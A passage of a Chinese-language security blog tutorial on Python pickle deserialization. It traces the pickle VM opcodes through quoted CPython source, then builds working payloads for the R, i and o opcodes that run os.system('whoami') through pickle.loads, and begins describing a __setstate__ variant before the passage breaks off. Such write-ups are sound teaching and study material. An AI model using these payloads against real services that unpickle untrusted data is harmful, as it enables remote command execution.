+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">memo</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">类</span><span class="p">)</span> <span class="p">,</span> <span class="p">(</span><span class="n">对象</span><span class="p">),{},</span><span class="s2">&#34;animal&#34;</span><span class="p">,</span><span class="s2">&#34;dog&#34;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十三步读取 <code>s</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_setitem</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>  <span class="c1">#&#34;dog&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>   <span class="c1">#&#34;animal&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">dict</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>    <span class="c1">#栈顶{}</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">dict</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>   <span class="c1">#{&#34;animal&#34;:&#34;dog&#34;}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">SETITEM</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_setitem</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">对象</span><span class="p">),{</span><span class="s2">&#34;animal&#34;</span><span class="p">:</span><span class="s2">&#34;dog&#34;</span><span class="p">}]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十四步读取 <code>b</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_build</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="c1">#{&#34;animal&#34;:&#34;dog&#34;}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">inst</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1">#(对象)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setstate</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="s2">&#34;__setstate__&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">setstate</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">            <span class="c1">#检查是否存在 __setstate__ 方法 一般是不存在的</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">###############################################</span>
+</span></span><span class="line"><span class="cl">            <span class="n">setstate</span><span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="c1">###########会造成任意函数调用</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">############################################</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="n">slotstate</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">slotstate</span> <span class="o">=</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">inst_dict</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="vm">__dict__</span>
+</span></span><span class="line"><span class="cl">            <span class="n">intern</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">intern</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">state</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">inst_dict</span><span class="p">[</span><span class="n">intern</span><span class="p">(</span><span class="n">k</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">inst_dict</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">slotstate</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">slotstate</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">setattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BUILD</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_build</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">拥有数据的对象</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十五步读取 <code>.</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">_Stop</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">STOP</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_stop</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反序列结束</p>
+<h2 id="分析-x-2" class="headerLink">
+    <a href="#%e5%88%86%e6%9e%90-x-2" class="header-mark"></a>分析 x 2</h2><p>因为别的师傅又发了一个分析的文章觉得写的非常非常的好，想并进来一起分析了（直接拿师傅的例子这里先拜谢了（文章地址会放到最后引用处））
+<figure><img
+        
+        loading="lazy"
+        src="https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp"
+        srcset="https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp, https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp 1.5x, https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp 2x"
+        alt="https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp"
+        title="https://pic4.zhimg.com/80/v2-d5bb5c00844a18dcb3b49883383061d7_1440w.webp" ></figure></p>
+<ul>
+<li>
+<p>第一步
+首先读取前面的\x80，pickle看见之后会往后再读取下一个字节，即\x03
+表示这个是pickle3.0的协议</p>
+</li>
+<li>
+<p>第二步
+机器读取下一个<code>c</code>操作符（也叫做GLOBAL操作符）<strong>连续读取两个字符串</strong><code>module</code>和<code>name</code>，于是把<code>__module__.Student</code>压进栈里</p>
+<p>注：GLOBAL操作符读取全局变量，是使用的<code>find_class</code>函数。而<code>find_class</code>对于不同的协议版本实现也不一样。总之，它干的事情是“去<code>x</code>模块找到<code>y</code>”，<code>y</code>必须在<code>x</code>的顶层（也即，y不能在嵌套的内层）。</p>
+</li>
+<li>
+<p>第三步
+机器读取到<code>)</code>操作符，表示把一个空的tuple（元组）压入当前栈
+记住这里的当前栈和栈空间不是一个东西
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/4.png"
+        srcset="/img/pickle/4.png, /img/pickle/4.png 1.5x, /img/pickle/4.png 2x"
+        alt="/img/pickle/4.png"
+        title="/img/pickle/4.png" ></figure></p>
+</li>
+<li>
+<p>第四步
+读取到\0x81操作符，它的作用是：从栈中先弹出一个元素，记为<code>args</code>；再弹出一个元素，记为<code>cls</code>。接下来，执行<code>cls.__new__(cls, *args)</code>，其实就是实例化了<code>Student</code>把得到的实例压进栈中，所以此时栈中只有一个元素.</p>
+</li>
+<li>
+<p>第五步
+读取<code>}</code>操作符，他将一个空的dict压入栈。</p>
+</li>
+<li>
+<p>第六步
+MARK操作符，这个操作符干的事情称为<code>load_mark</code>：</p>
+</li>
+<li>
+<p>把<strong>当前栈</strong>这个整体，作为一个list，压进<strong>前序栈</strong>。</p>
+</li>
+<li>
+<p>把<strong>当前栈</strong>清空。
+然后还有一个东西叫做<code>pop_mark</code>：</p>
+</li>
+<li>
+<p>记录一下当前栈的信息，作为一个list，在<code>load_mark</code>结束时返回。</p>
+</li>
+<li>
+<p>弹出<strong>前序栈</strong>的栈顶，用这个list来覆盖<strong>当前栈</strong>。
+其实就是相互的过程</p>
+</li>
+<li>
+<p>第七步
+读取到操作符<code>V</code>，读入一个字符串，以<code>\n</code>结尾；然后把这个字符串压进栈中。所以此时的栈的元素是：name, rxz, grade, G2
+此时前序栈只有一个元素，是一个list，这个list里面有两个元素：一个空的Student实例，以及一个空的dict。</p>
+</li>
+<li>
+<p>第八步
+读取到操作符<code>u</code>：</p>
+</li>
+<li>
+<p>调用<code>pop_mark</code>。也就是说，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态。<br>
+执行完成之后，<code>arr=['name', 'rxz', 'grade', 'G2']</code>；当前栈里面存的是<code>__main__.Student</code>这个类、一个空的<code>dict</code></p>
+</li>
+<li>
+<p>拿到当前栈的末尾元素，规定必须是一个<code>dict</code>。<br>
+这里，读到了栈顶那个空<code>dict</code>。</p>
+</li>
+<li>
+<p>两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value，存进上一条所述的<code>dict</code>。</p>
+</li>
+<li>
+<p>第九步
+读取到<code>b</code>操作符：</p>
+</li>
+<li>
+<p>把当前栈栈顶存进<code>state</code>，然后弹掉。</p>
+</li>
+<li>
+<p>把当前栈栈顶记为<code>inst</code>，然后弹掉。</p>
+</li>
+<li>
+<p>利用<code>state</code>这一系列的值来<strong>更新实例</strong><code>inst</code>。把得到的对象扔进当前栈。</p>
+<p>注：这里更新实例的方式是：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。
+最后就弹出序列化的最终结果。</p>
+</li>
+</ul>
+<h2 id="利用" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8" class="header-mark"></a>利用</h2><h3 id="常见执行函数的操作符指令" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0%e7%9a%84%e6%93%8d%e4%bd%9c%e7%ac%a6%e6%8c%87%e4%bb%a4" class="header-mark"></a>常见执行函数的操作符（指令）</h3><h4 id="r操作符" class="headerLink">
+    <a href="#r%e6%93%8d%e4%bd%9c%e7%ac%a6" class="header-mark"></a>R操作符</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_reduce</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
+</span></span><span class="line"><span class="cl">        <span class="n">args</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">func</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>弹出栈作为函数执行的参数，因此这里的参数需要是元组形式，然后取栈中最后一个元素作为函数，并将指向结果赋值给此元素<br>
+因此这里的话，我们想执行的命令<code>whoami</code>放入栈中，再把<code>system</code>模块放入栈中，即可实现函数的函数执行<br>
+构造payload如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;cos</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoami</span><span class="se">\x85</span><span class="s1">R.&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/5.png"
+        srcset="/img/pickle/5.png, /img/pickle/5.png 1.5x, /img/pickle/5.png 2x"
+        alt="/img/pickle/5.png"
+        title="/img/pickle/5.png" ></figure>
+可以看见执行了whoami的命令</p>
+<h4 id="i操作符" class="headerLink">
+    <a href="#i%e6%93%8d%e4%bd%9c%e7%ac%a6" class="header-mark"></a>i操作符</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_inst</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">module</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">klass</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_instantiate</span><span class="p">(</span><span class="n">klass</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">pop_mark</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>向下依次读取两行分别作为<code>module</code>和<code>name</code>，然后利用<code>find_class</code>寻找对应方法，通过<code>pop_mark()</code>函数得到参数，利用<code>_instantiate</code>函数执行，将结果存入栈中，<code>pop_mark()</code>对应代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">pop_mark</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">items</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">metastack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">append</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">items</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里是获取当前栈赋给<code>items</code>，然后弹出栈内元素，再把这个栈赋值给当前栈，然后返回<code>items</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;(X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamiios</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/6.png"
+        srcset="/img/pickle/6.png, /img/pickle/6.png 1.5x, /img/pickle/6.png 2x"
+        alt="/img/pickle/6.png"
+        title="/img/pickle/6.png" ></figure></p>
+<h4 id="o操作符" class="headerLink">
+    <a href="#o%e6%93%8d%e4%bd%9c%e7%ac%a6" class="header-mark"></a>o操作符</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_obj</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Stack is ... markobject classobject arg1 arg2 ...</span>
+</span></span><span class="line"><span class="cl">        <span class="n">args</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pop_mark</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">cls</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_instantiate</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个函数先弹出栈中一个元素作为<code>args</code>，也就是参数，而后再弹出第一个元素作为函数，调用<code>_instantiate</code>函数自执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;(cos</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamio.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/7.png"
+        srcset="/img/pickle/7.png, /img/pickle/7.png 1.5x, /img/pickle/7.png 2x"
+        alt="/img/pickle/7.png"
+        title="/img/pickle/7.png" ></figure></p>
+<h4 id="b操作符" class="headerLink">
+    <a href="#b%e6%93%8d%e4%bd%9c%e7%ac%a6" class="header-mark"></a>b操作符</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_build</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">inst</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setstate</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="s2">&#34;__setstate__&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">setstate</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">setstate</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="n">slotstate</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">slotstate</span> <span class="o">=</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">inst_dict</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="vm">__dict__</span>
+</span></span><span class="line"><span class="cl">            <span class="n">intern</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">intern</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">state</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">inst_dict</span><span class="p">[</span><span class="n">intern</span><span class="p">(</span><span class="n">k</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">inst_dict</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">slotstate</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">slotstate</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">setattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个函数是当栈中存在<code>__setstate__</code>时，就会执行<code>setstate(state)</code>，因此我们这里自定义一个<code>__setstate__</code>类，分别构造<code>os.system</code>和<code>whoami</code>即可执行命令</p>
+<div class="highlight"><div class="chroma">
